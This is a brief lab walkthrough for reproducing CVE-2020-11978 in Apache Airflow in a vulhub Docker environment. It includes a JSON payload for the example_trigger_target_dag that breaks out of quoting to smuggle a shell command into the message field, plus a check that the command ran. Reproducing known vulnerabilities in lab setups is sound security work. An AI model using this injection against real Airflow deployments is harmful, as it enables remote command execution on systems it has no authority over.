# Airflow CVE-2020-11978

https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978


```
# Start the scene
docker compose up -d

# open trigger
example_trigger_target_dag

# payload
{"message":"'\";touch /tmp/airflow_dag_success;#"}

docker exec -it airflow_test-airflow-worker-1 ls -l /tmp
```
